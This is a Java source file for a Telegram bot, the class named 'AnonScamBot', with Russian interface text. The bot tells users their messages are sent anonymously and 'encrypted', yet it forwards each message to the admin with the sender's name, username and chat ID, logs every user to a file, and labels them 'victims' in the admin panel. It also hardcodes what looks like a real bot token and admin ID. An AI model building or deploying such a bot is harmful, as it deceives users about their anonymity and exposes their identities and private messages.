package TelegramBot;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.ActionType;
import org.telegram.telegrambots.meta.api.methods.send.*;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.*;
import java.nio.file.*;
import java.util.*;

public class AnonScamBot extends TelegramLongPollingBot {

    private final String BOT_TOKEN = "8384130940:AAF9ltnafUCyq2C8ncPQWiaYmTdO6-XLbOE";
    private final String ADMIN_ID = "5438580724";
    private final String BOT_NAME = "KinkaliyovAnonBot";

    private final Set<String> userLog = new LinkedHashSet<>();
    private final Set<String> blackList = new HashSet<>();
    private final String FILE_NAME = "users.txt";
    private final String BAN_FILE = "blacklist.txt";

    private boolean isWaitingForId = false;
    private boolean isWaitingForBroadcast = false;
    private boolean isWaitingForBan = false;
    private String targetUserId = "";

    public AnonScamBot() {
        loadData(FILE_NAME, userLog);
        loadData(BAN_FILE, blackList);
    }

    @Override public String getBotUsername() { return BOT_NAME; }
    @Override public String getBotToken() { return BOT_TOKEN; }

    @Override
    public void onUpdateReceived(Update update) {
        if (!update.hasMessage()) return;

        Message message = update.getMessage();
        String chatId = message.getChatId().toString();

        // ПРОВЕРКА БАНА
        if (blackList.contains(chatId) && !chatId.equals(ADMIN_ID)) return;

        // ШПИОН И ЛОГИНГ
        handleSpyAndLogging(update, chatId);

        // --- ЛОГИКА АДМИНА ---
        if (chatId.equals(ADMIN_ID)) {
            if (message.hasText()) {
                String text = message.getText();

                if (text.equals("/admin")) { sendAdminPanel(); return; }

                if (text.equals("👥 Список людей")) {
                    sendMsg(ADMIN_ID, "📊 **ПОЛНЫЙ СПИСОК ЖЕРТВ:**\n\n" + (userLog.isEmpty() ? "Пусто" : String.join("\n", userLog)));
                    return;
                }

                if (text.equals("📊 Статистика")) {
                    sendMsg(ADMIN_ID, "📈 **СТАТИСТИКА БОТА:**\n\nЖивых юзеров: " + userLog.size() + "\nВ бане (черный список): " + blackList.size());
                    return;
                }

                if (text.equals("🚫 Бан/Разбан")) {
                    isWaitingForBan = true;
                    sendMsg(ADMIN_ID, "Введи ID для бана или разбана (цифрами):");
                    return;
                }

                if (isWaitingForBan) {
                    toggleBan(text);
                    isWaitingForBan = false;
                    return;
                }

                if (text.equals("📢 Рассылка всем")) {
                    isWaitingForBroadcast = true;
                    sendMsg(ADMIN_ID, "📢 Режим рассылки!\nОтправь ЛЮБОЕ сообщение (текст, фото, гифку, стикер), чтобы разослать его всем.");
                    return;
                }

                if (isWaitingForBroadcast) {
                    isWaitingForBroadcast = false;
                    broadcastMedia(message);
                    return;
                }

                if (text.equals("📩 Написать юзеру")) {
                    isWaitingForId = true;
                    sendMsg(ADMIN_ID, "Введи ID юзера, которому хочешь написать лично:");
                    return;
                }

                if (isWaitingForId && targetUserId.isEmpty()) {
                    targetUserId = text;
                    sendMsg(ADMIN_ID, "ID принят. Теперь отправь контент для юзера:");
                    return;
                }

                if (isWaitingForId && !targetUserId.isEmpty()) {
                    forwardToUser(targetUserId, message);
                    sendMsg(ADMIN_ID, "✅ Сообщение доставлено.");
                    isWaitingForId = false; targetUserId = "";
                    return;
                }
            }

            if (message.getReplyToMessage() != null) {
                processAdminResponse(update);
                return;
            }
        }

        // --- ЛОГИКА ОБЫЧНОГО ЮЗЕРА ---
        if (!chatId.equals(ADMIN_ID)) {
            if (message.hasText() && (message.getText().equals("/start") || message.getText().equals("Хочу написать еще!"))) {
                sendMenu(chatId, "Бот готов. Напиши что-нибудь — это будет отправлено анонимно.");
                return;
            }

            forwardToAdmin(update);
            sendTypingAction(chatId);
            sendFinishMenu(chatId, "✅ Сообщение зашифровано и отправлено!\nХочешь написать еще?");
        }
    }

    private void handleSpyAndLogging(Update update, String chatId) {
        String name = update.getMessage().getFrom().getFirstName();
        String user = update.getMessage().getFrom().getUserName();
        String fullInfo = String.format("%s (@%s) | ID: %s", name, (user != null ? user : "скрыт"), chatId);

        boolean exists = false;
        for (String entry : userLog) {
            if (entry.contains("ID: " + chatId)) { exists = true; break; }
        }

        if (!chatId.equals(ADMIN_ID) && !exists) {
            userLog.add(fullInfo);
            saveToFile(FILE_NAME, fullInfo);
            sendMsg(ADMIN_ID, "👤 **НОВЫЙ КЛИЕНТ ЗАШЕЛ:**\n" + fullInfo);
        }
    }

    private void broadcastMedia(Message msg) {
        int count = 0;
        for (String entry : userLog) {
            try {
                String id = entry.substring(entry.lastIndexOf("ID: ") + 4).trim();
                if (id.equals(ADMIN_ID)) continue;

                if (msg.hasText()) sendMsg(id, "📢 **ОБЪЯВЛЕНИЕ:**\n" + msg.getText());
                else if (msg.hasPhoto()) execute(SendPhoto.builder().chatId(id).photo(new InputFile(msg.getPhoto().get(msg.getPhoto().size()-1).getFileId())).caption(msg.getCaption()).build());
                else if (msg.hasSticker()) execute(SendSticker.builder().chatId(id).sticker(new InputFile(msg.getSticker().getFileId())).build());
                else if (msg.hasAnimation()) execute(SendAnimation.builder().chatId(id).animation(new InputFile(msg.getAnimation().getFileId())).caption(msg.getCaption()).build());
                else if (msg.hasVoice()) execute(SendVoice.builder().chatId(id).voice(new InputFile(msg.getVoice().getFileId())).build());
                else if (msg.hasVideo()) execute(SendVideo.builder().chatId(id).video(new InputFile(msg.getVideo().getFileId())).caption(msg.getCaption()).build());
                count++;
            } catch (Exception e) {}
        }
        sendMsg(ADMIN_ID, "✅ Рассылка завершена. Получили: " + count + " чел.");
    }

    private void toggleBan(String id) {
        if (blackList.contains(id)) {
            blackList.remove(id);
            removeFromFile(BAN_FILE, id);
            sendMsg(ADMIN_ID, "✅ Юзер " + id + " разбанен.");
        } else {
            blackList.add(id);
            saveToFile(BAN_FILE, id);
            sendMsg(ADMIN_ID, "🚫 Юзер " + id + " отправлен в бан.");
        }
    }

    private void forwardToAdmin(Update update) {
        Message msg = update.getMessage();
        String info = String.format("\n\n🎯 **ОТПРАВИТЕЛЬ:** %s\n🆔 ID: %s", msg.getFrom().getFirstName(), msg.getChatId());
        try {
            if (msg.hasText()) sendMsg(ADMIN_ID, "💬 **Текст:** " + msg.getText() + info);
            else if (msg.hasPhoto()) execute(SendPhoto.builder().chatId(ADMIN_ID).photo(new InputFile(msg.getPhoto().get(msg.getPhoto().size()-1).getFileId())).caption("📸 Фото" + info).build());
            else if (msg.hasVoice()) execute(SendVoice.builder().chatId(ADMIN_ID).voice(new InputFile(msg.getVoice().getFileId())).caption("🎤 ГС" + info).build());
            else if (msg.hasVideo()) execute(SendVideo.builder().chatId(ADMIN_ID).video(new InputFile(msg.getVideo().getFileId())).caption("🎥 Видео" + info).build());
            else if (msg.hasAnimation()) execute(SendAnimation.builder().chatId(ADMIN_ID).animation(new InputFile(msg.getAnimation().getFileId())).caption("🎞 Гиф" + info).build());
            else if (msg.hasSticker()) execute(SendSticker.builder().chatId(ADMIN_ID).sticker(new InputFile(msg.getSticker().getFileId())).build());
            else if (msg.hasVideoNote()) { execute(SendVideoNote.builder().chatId(ADMIN_ID).videoNote(new InputFile(msg.getVideoNote().getFileId())).build()); sendMsg(ADMIN_ID, "⬆️ Кружок!" + info); }
        } catch (Exception e) {}
    }

    private void forwardToUser(String targetId, Message msg) {
        try {
            if (msg.hasText()) sendMsg(targetId, "📩 **Ответ от владельца:**\n" + msg.getText());
            else if (msg.hasPhoto()) execute(SendPhoto.builder().chatId(targetId).photo(new InputFile(msg.getPhoto().get(msg.getPhoto().size()-1).getFileId())).caption(msg.getCaption()).build());
            else if (msg.hasSticker()) execute(SendSticker.builder().chatId(targetId).sticker(new InputFile(msg.getSticker().getFileId())).build());
            else if (msg.hasAnimation()) execute(SendAnimation.builder().chatId(targetId).animation(new InputFile(msg.getAnimation().getFileId())).build());
            else if (msg.hasVoice()) execute(SendVoice.builder().chatId(targetId).voice(new InputFile(msg.getVoice().getFileId())).build());
        } catch (Exception e) {}
    }

    private void processAdminResponse(Update update) {
        Message replyTo = update.getMessage().getReplyToMessage();
        String text = (replyTo.hasText()) ? replyTo.getText() : replyTo.getCaption();
        if (text != null && text.contains("🆔 ID: ")) {
            String tid = text.substring(text.lastIndexOf("ID: ") + 4).trim();
            forwardToUser(tid, update.getMessage());
            sendMsg(ADMIN_ID, "✅ Доставлено по Reply.");
        }
    }

    private void sendAdminPanel() {
        ReplyKeyboardMarkup rkm = new ReplyKeyboardMarkup(); rkm.setResizeKeyboard(true);
        List<KeyboardRow> k = new ArrayList<>();
        KeyboardRow r1 = new KeyboardRow(); r1.add("👥 Список людей"); r1.add("📊 Статистика");
        KeyboardRow r2 = new KeyboardRow(); r2.add("📢 Рассылка всем"); r2.add("🚫 Бан/Разбан");
        KeyboardRow r3 = new KeyboardRow(); r3.add("📩 Написать юзеру");
        k.add(r1); k.add(r2); k.add(r3); rkm.setKeyboard(k);
        executeSafe(SendMessage.builder().chatId(ADMIN_ID).text("🛠 ПАНЕЛЬ УПРАВЛЕНИЯ БОТОМ:").replyMarkup(rkm).build());
    }

    private void saveToFile(String file, String data) { try (BufferedWriter bw = new BufferedWriter(new FileWriter(file, true))) { bw.write(data); bw.newLine(); } catch (IOException e) {} }
    private void loadData(String file, Set<String> set) { try { if (Files.exists(Paths.get(file))) set.addAll(Files.readAllLines(Paths.get(file))); } catch (IOException e) {} }
    private void removeFromFile(String file, String id) {
        try { List<String> lines = Files.readAllLines(Paths.get(file)); lines.removeIf(line -> line.contains(id)); Files.write(Paths.get(file), lines); } catch (IOException e) {}
    }

    private void sendTypingAction(String id) { try { execute(SendChatAction.builder().chatId(id).action(ActionType.TYPING.toString()).build()); Thread.sleep(700); } catch (Exception e) {} }
    private void sendMenu(String id, String t) {
        ReplyKeyboardMarkup r = new ReplyKeyboardMarkup(); r.setResizeKeyboard(true); List<KeyboardRow> k = new ArrayList<>();
        KeyboardRow row = new KeyboardRow(); row.add("🕵️ Анонимно"); row.add("❌ Не анонимно"); k.add(row); r.setKeyboard(k);
        executeSafe(SendMessage.builder().chatId(id).text(t).replyMarkup(r).build());
    }
    private void sendFinishMenu(String id, String t) {
        ReplyKeyboardMarkup r = new ReplyKeyboardMarkup(); r.setResizeKeyboard(true); List<KeyboardRow> k = new ArrayList<>();
        KeyboardRow row = new KeyboardRow(); row.add("Хочу написать еще!"); k.add(row); r.setKeyboard(k);
        executeSafe(SendMessage.builder().chatId(id).text(t).replyMarkup(r).build());
    }
    private void sendMsg(String id, String t) { executeSafe(SendMessage.builder().chatId(id).text(t).parseMode("Markdown").build()); }
    private void executeSafe(SendMessage s) { try { execute(s); } catch (TelegramApiException e) {} }

    public static void main(String[] args) {
        try { new TelegramBotsApi(DefaultBotSession.class).registerBot(new AnonScamBot()); System.out.println(">>> КИНКАЛИЕВ БОТ ОНЛАЙН!"); } catch (Exception e) { e.printStackTrace(); }
    }
}